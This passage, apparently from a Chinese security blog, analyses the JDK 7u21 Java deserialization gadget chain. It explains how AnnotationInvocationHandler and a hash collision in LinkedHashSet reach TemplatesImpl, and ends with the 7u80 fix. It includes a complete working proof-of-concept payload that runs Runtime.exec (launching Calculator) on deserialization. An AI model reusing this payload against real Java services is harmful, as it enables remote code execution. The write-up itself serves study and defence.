<p>&#x6838;&#x5FC3;&#x539F;&#x56E0;&#x662F;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x89E6;&#x53D1; <code>AnnotationInvocationHandler#invoke</code>&#x662F;&#x8FD9;&#x4E9B; if &#x5224;&#x65AD;&#x548C;&#x53C2;&#x6570;&#x9644;&#x503C;&#x3002;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x6765; <code>var4</code> &#x9700;&#x8981;&#x7B49;&#x4E8E; <code>equals</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x624D;&#x884C;&#xFF0C;&#x540E;&#x9762;&#x7684; <code>this.equalsImpl(var3[0]);</code> &#x662F;&#x4E00;&#x4E2A;&#x5173;&#x952E;&#x65B9;&#x6CD5;&#xFF0C;&#x6B64;&#x65F6; <code>var3[0]</code> &#x662F;&#x6211;&#x4EEC; POC &#x4E2D;&#x7684; <code>equals</code>&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x4E5F;&#x5C31;&#x662F; <code>templates</code></p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214174341040.png" alt></p>
<p><code>AnnotationInvocationHandler#equalsImpl</code> &#x8FD9;&#x91CC;&#x4F1A;&#x5FAA;&#x73AF;&#x904D;&#x5386; <code>javax.xml.transform.Templates</code> &#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x88AB;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;  <code>templates</code> &#x8C03;&#x7528;</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214175058607.png" alt="image-20210214175058607"></p>
<p>&#x540E;&#x7EED;&#x5BFB;&#x627E;&#x8C03;&#x7528;&#x94FE;&#x8981;&#x627E;&#x5230;&#x53EF;&#x4EE5;&#x4F20;&#x5165;&#x4E00;&#x4E2A; proxy&#xFF0C;&#x540C;&#x65F6;&#x8C03;&#x7528; equals &#x65B9;&#x6CD5;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x80FD;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x7684;&#x5730;&#x65B9;</p>
<p>&#x8FD9;&#x91CC;&#x770B;&#x4E00;&#x4E0B; LinkedHashSet&#xFF0C;&#x5176;&#x7EE7;&#x627F;&#x81EA; HashSet &#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x8981;&#x627E;&#x5230;&#x6EE1;&#x8DB3;&#x8C03;&#x7528;&#x94FE;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;LinkedHashSet &#x662F;&#x6709;&#x5E8F;&#x7684;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x5B83;&#xFF0C;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x81EA;&#x7236;&#x7C7B;</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216162034161.png" alt></p>
<p>&#x5176;&#x5B9E;&#x73B0;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x903B;&#x8F91;&#x4E5F;&#x90FD;&#x5B58;&#x5728;&#x5728;&#x7236;&#x7C7B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5728; CC &#x4E2D;&#x5206;&#x6790;&#x8FC7; HashSet</p>
<p>&#x5176;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x4F1A;&#x6062;&#x590D;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x5E76;&#x8C03;&#x7528; HashMap &#x7684; put &#x65B9;&#x6CD5;&#xFF0C;&#x5C06;&#x5176;&#x653E;&#x5165; HashMap &#x4E2D;</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210219204734743.png" alt></p>
<p><code>HashMap#put</code> &#x662F;&#x6211;&#x4EEC;&#x8C03;&#x7528;&#x7684;&#x5173;&#x952E;&#x5730;&#x65B9;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>{</span><br><span class="line">  <span class="hljs-comment">// &#x5224;&#x65AD; key &#x662F;&#x5426;&#x4E3A;null</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (key == <span class="hljs-keyword">null</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> putForNullKey(value);</span><br><span class="line">  <span class="hljs-comment">// &#x8BA1;&#x7B97; key &#x7684; hash</span></span><br><span class="line">    <span class="hljs-keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="hljs-keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-keyword">null</span>; e = e.next) {</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="hljs-keyword">this</span>);</span><br><span class="line">            <span class="hljs-keyword">return</span> oldValue;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6838;&#x5FC3;&#x8BED;&#x53E5;&#x4E3A; <code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code> &#xFF0C;&#x8FD9;&#x91CC; <code>key.equals(k)</code> &#x662F;&#x6211;&#x4EEC;&#x53CD;&#x5E8F;&#x5217;&#x5316; POC &#x60F3;&#x8C03;&#x7528;&#x7684;&#x4E00;&#x4E2A;&#x7ED3;&#x6784;</p>
<p>&#x56E0;&#x6B64;&#x6839;&#x636E;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;&#x7684;&#x77ED;&#x8DEF;&#x7279;&#x6027;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x7B2C;&#x4E00;&#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x9700;&#x8981;&#x4E0D;&#x6EE1;&#x8DB3;&#x7B2C;&#x4E8C;&#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;&#x624D;&#x4F1A;&#x8C03;&#x7528;&#x5230;&#x7B2C;&#x4E09;&#x4E2A;&#x6761;&#x4EF6;</p>
<p>&#x8FD9;&#x91CC;&#x4F1A;&#x6709;&#x4E24;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;&#x5148;&#x770B;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;key &#x4E3A;&#x6211;&#x4EEC;&#x7684; POC &#x7684; <code>testTarget.add(templates);</code> &#x7684; TemplatesImpl &#x5BF9;&#x8C61;&#xFF0C;&#x7531;&#x4E8E;&#x5F53;&#x524D; table &#x53D8;&#x91CF;&#x6307;&#x5411;&#x7684; Entry &#x5BF9;&#x8C61;&#x662F;&#x7A7A;&#x7684;&#xFF0C;&#x6240;&#x4EE5; e &#x662F;&#x4E3A;null&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x6EE1;&#x8DB3; for &#x5FAA;&#x73AF;&#x6761;&#x4EF6;&#xFF0C;&#x5728;&#x540E;&#x9762;&#x4F1A;&#x8C03;&#x7528; <code>addEntry</code> &#x6DFB;&#x52A0;&#x8FDB; table&#xFF0C;table&#x662F;&#x4E00;&#x4E2A;Entry&#x6570;&#x7EC4;&#xFF0C;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6211;&#x4EEC;&#x901A;&#x8FC7;<code>map.put()</code>&#x4F20;&#x5165;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x5E76;&#x4F5C;&#x4E3A;&#x540E;&#x7EED;&#x5224;&#x65AD;&#x65B0;&#x4F20;&#x5165;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x548C;&#x65E7;&#x952E;&#x503C;&#x5BF9;&#x662F;&#x5426;&#x91CD;&#x590D;&#x7684;&#x4F9D;&#x636E;</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220151023288.png" alt></p>
<p>&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x4E3A;&#x4E86;&#x6EE1;&#x8DB3; <code>e != null</code> &#x90A3;&#x4E48;&#x9700;&#x8981;&#x63A7;&#x5236; i &#x7684;&#x503C;&#xFF0C;&#x4F7F;&#x5176;&#x80FD;&#x4ECE; table &#x91CC;&#x9762;&#x53D6;&#x51FA;&#x76F8;&#x5E94;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x63A7;&#x5236;&#x4E24;&#x6B21;&#x5FAA;&#x73AF;&#x4E2D; hash &#x4E4B;&#x540E;&#x7684;&#x503C;&#x76F8;&#x7B49;</p>
<p>&#x5148;&#x770B;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x4E2D;&#x8BA1;&#x7B97; hash &#x503C;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object k)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> h = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> (useAltHashing) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (k <span class="hljs-keyword">instanceof</span> String) {</span><br><span class="line">            <span class="hljs-keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        }</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="hljs-comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="hljs-comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="hljs-number">20</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">12</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="hljs-number">7</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">4</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x8BA1;&#x7B97; hash &#x503C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x6CA1;&#x6709; hashCode &#x65B9;&#x6CD5;&#xFF0C;&#x4F1A;&#x76F8;&#x5E94;&#x8C03;&#x7528;&#x53CD;&#x5C04;&#x6765;&#x89E3;&#x51B3;&#xFF0C;&#x6700;&#x7EC8;&#x8C03;&#x7528;&#x5230; <code>AnnotationInvocationHandler#hashCodeImpl</code></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">hashCodeImpl:<span class="hljs-number">294</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:<span class="hljs-number">64</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">hashCode:-<span class="hljs-number">1</span>, $Proxy1 (com.sun.proxy)</span><br><span class="line">hash:<span class="hljs-number">351</span>, HashMap (java.util)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220160741224.png" alt></p>
<blockquote>
<p>&#x6B64;&#x65F6;&#x7684;var2&#x662F;&#x4E00;&#x4E2A;Iterator&#x5BF9;&#x8C61;&#xFF0C;&#x7528;&#x6765;&#x904D;&#x5386;memberValues&#x5BF9;&#x8C61;&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;memberValues&#x4E2D;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x5C31;&#x662F;&#xFF0C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5728;&#x521D;&#x671F;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x751F;&#x6210; AnnotationInvocationHandler &#x5BF9;&#x8C61;&#x65F6;&#x4F20;&#x5165;&#x7684; HashMap &#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x90A3;&#x4E2A;&#x952E;&#x503C;&#x5BF9; </p>
</blockquote>
<p>key&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x201D;f5a5a608&#x201D; </p>
<p>Value&#x503C;&#x662F;&#x548C;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x65F6;&#x7528;&#x6765;&#x8BA1;&#x7B97;hash&#x503C;&#x7684;&#x540C;&#x4E00;&#x4E2A;TemplatesImpl&#x5BF9;&#x8C61;</p>
<p>&#x770B;&#x4E00;&#x4E0B;&#x5177;&#x4F53; hash &#x503C;&#x7684;&#x8BA1;&#x7B97;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">var1 += <span class="hljs-number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5177;&#x4F53;&#x5206;&#x4E3A;&#x4E86;&#x4E24;&#x6BB5;</p>
<ol>
<li><code>127 * ((String)var3.getKey()).hashCode()</code></li>
<li><code>memberValueHashCode(var3.getValue()</code></li>
</ol>
<p>&#x7B2C;&#x4E8C;&#x6BB5;&#x7531;&#x4E8E; Value &#x4E3A;&#x8BA1;&#x7B97;hash&#x503C;&#x7684;&#x540C;&#x4E00;&#x4E2A;TemplatesImpl&#x5BF9;&#x8C61;&#xFF0C;&#x56E0;&#x6B64;&#x8BA1;&#x7B97;&#x51FA;&#x6765;&#x8DDF;&#x4E4B;&#x524D;&#x7684;&#x76F8;&#x7B49;</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220162047284.png" alt></p>
<p>&#x4E00;&#x4E2A;&#x5C0F; trick &#x662F;&#xFF1A;0&#x548C;&#x4EFB;&#x4F55;&#x6570;&#x5B57;&#x8FDB;&#x884C;&#x5F02;&#x6216;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x90FD;&#x662F;&#x88AB;&#x5F02;&#x6216;&#x6570;&#x672C;&#x8EAB;</p>
<p>&#x90A3;&#x4E48;&#x53EA;&#x8981;&#x63A7;&#x5236;&#x7B2C;&#x4E00;&#x6BB5;&#x7ED3;&#x679C;&#x4E3A; 0 &#xFF0C;&#x90A3;&#x4E48;&#x7B97;&#x51FA;&#x6765;&#x5F02;&#x6216;&#x503C;&#x4E0D;&#x53D8;&#xFF0C;&#x90A3;&#x4E48;&#x7ED3;&#x5408;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x8BF4;&#x7684;trick&#xFF0C;var3 &#x6B64;&#x523B;&#x7684; key &#x4E3A; <code>f5a5a608</code>&#xFF0C;&#x56E0;&#x6B64;&#x8DDF;&#x4EFB;&#x4F55;&#x6570;&#x76F8;&#x4E58;&#x90FD;&#x4E3A; 0</p>
<p>&#x56DE;&#x5230;&#x6211;&#x4EEC; <code>HashMap#put</code> &#x7684; <code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code></p>
<p>&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x4E3A; hash &#x5224;&#x65AD;&#xFF0C;&#x6211;&#x4EEC;&#x521A;&#x521A;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x5DF2;&#x7ECF;&#x8BA9;&#x5176;&#x76F8;&#x7B49;&#x4E86;</p>
<p>&#x7B2C;&#x4E8C;&#x4E2A;&#x5224;&#x65AD;&#x5C06;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x65F6;&#x7684; key &#x53D6;&#x51FA;&#x548C;&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x65F6;&#x7684; key &#x6BD4;&#x8F83;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x7684;key&#x662F;TemplatesImpl&#x5BF9;&#x8C61;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x65F6; key &#x4E3A; Proxy &#x5BF9;&#x8C61;&#xFF0C;&#x6240;&#x4EE5;&#x7ED3;&#x679C;&#x4E3A;flase</p>
<p>&#x6700;&#x540E;&#x8C03;&#x7528; <code>key.equals(k)</code>&#xFF0C;&#x8FD9;&#x91CC;&#x7684; key &#x4E3A;&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x7684;&#xFF0C;k &#x4E3A;&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x603B;&#x7ED3;&#x4E86;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x6709;&#x5E8F;&#x7684;HashSet&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x7684; LinkedHashSet&#x3002;&#x8FD9;&#x6837;&#x624D;&#x80FD;&#x4FDD;&#x8BC1;&#x6211;&#x4EEC;&#x7684;&#x8C03;&#x7528;&#x5148;&#x540E;</p>
<p><strong>JDK 7u21 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span></span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Map testMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Constructor aih_construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="hljs-number">0</span>];</span><br><span class="line">        aih_construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler testHandler = (InvocationHandler) aih_construct.newInstance(Override.class, testMap);</span><br><span class="line">        setFieldValue(testHandler, <span class="hljs-string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]{Templates.class}, testHandler);</span><br><span class="line"><span class="hljs-comment">//        proxy.equals(templates);</span></span><br><span class="line">        String magicStr = <span class="hljs-string">&quot;f5a5a608&quot;</span>;</span><br><span class="line">        HashSet testTarget = <span class="hljs-keyword">new</span> LinkedHashSet();</span><br><span class="line">        testTarget.add(templates);</span><br><span class="line">        testTarget.add(proxy);</span><br><span class="line">        testMap.put(magicStr, templates);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(testTarget);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget Chain</span><br><span class="line">    LinkedHashSet.readObject()</span><br><span class="line">    LinkedHashSet.add()</span><br><span class="line">        ...</span><br><span class="line">        TemplatesImpl.hashCode() (X)</span><br><span class="line">    LinkedHashSet.add()</span><br><span class="line">        ...</span><br><span class="line">        Proxy(Templates).hashCode() (X)</span><br><span class="line">            AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">            AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">                String.hashCode() (<span class="hljs-number">0</span>)</span><br><span class="line">                AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">                TemplatesImpl.hashCode() (X)</span><br><span class="line">        Proxy(Templates).equals()</span><br><span class="line">            AnnotationInvocationHandler.invoke()</span><br><span class="line">            AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">                Method.invoke()</span><br><span class="line">                ...</span><br><span class="line">                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                    TemplatesImpl.newTransformer()</span><br><span class="line">                        TemplatesImpl.getTransletInstance()</span><br><span class="line">                        TemplatesImpl.defineTransletClasses()</span><br><span class="line">                            ClassLoader.defineClass()</span><br><span class="line">                            Class.newInstance()</span><br><span class="line">                            ...</span><br><span class="line">                                MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                ...</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h2><p>7u80&#x7248;&#x672C;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="hljs-keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="hljs-number">1</span> &amp;&amp; var3[<span class="hljs-number">0</span>] == Annotation.class) {</span><br><span class="line">            <span class="hljs-keyword">this</span>.type = var1;</span><br><span class="line">            <span class="hljs-keyword">this</span>.memberValues = var2;</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AnnotationFormatError(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5BF9; <code>this.type</code> &#x8FDB;&#x884C;&#x4E86;&#x6821;&#x9A8C;&#x5FC5;&#x987B;&#x4E3A; Annotation.class&#xFF0C;&#x540C;&#x65F6;&#x589E;&#x52A0;&#x4E86;&#x5F02;&#x5E38;&#x629B;&#x51FA;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5931;&#x8D25;</p>
<blockquote>
<p>7u25-b01&#x3001;7u25-b02&#x5C1A;&#x672A;&#x5982;&#x6B64;&#x4FEE;&#x8865;&#xFF0C;341&#x884C;&#x5904;&#x4ECD;&#x5728;return&#x3002;&#x6709;&#x4E9B;&#x6587;&#x7AE0;&#x8BF4;&#x4FEE;&#x8865;&#x65B9;&#x6848;&#x662F;&#x68C0;<br>&#x67E5;&#x4E86;AnnotationInvocationHandler.type&#xFF0C;&#x4F30;&#x8BA1;&#x4ED6;&#x4EEC;&#x662F;&#x6839;&#x636E;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x8FD9;&#x4E48;&#x8BF4;&#x7684;&#x3002;&#x4E8B;<br>&#x5B9E;&#x4E0A;&#x5BF9;AnnotationInvocationHandler.type&#x7684;&#x68C0;&#x67E5;&#x4E00;&#x76F4;&#x5B58;&#x5728;&#xFF0C;&#x8981;&#x6C42;type&#x4E0E;<br>java.lang.annotation.Annotation&#x6709;&#x6D3E;&#x751F;&#x3001;&#x7EE7;&#x627F;&#x3001;&#x5B9E;&#x73B0;&#x5173;&#x7CFB;&#xFF0C;&#x4F46;7u25-b03&#x4E4B;&#x524D;&#x53D1;&#x73B0;<br>&#x95EE;&#x9898;&#x540E;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x88AB;341&#x884C;&#x7684;catch&#x6355;&#x6349;&#x4E4B;&#x540E;&#x6CA1;&#x6709;&#x7EE7;&#x7EED;&#x629B;&#x5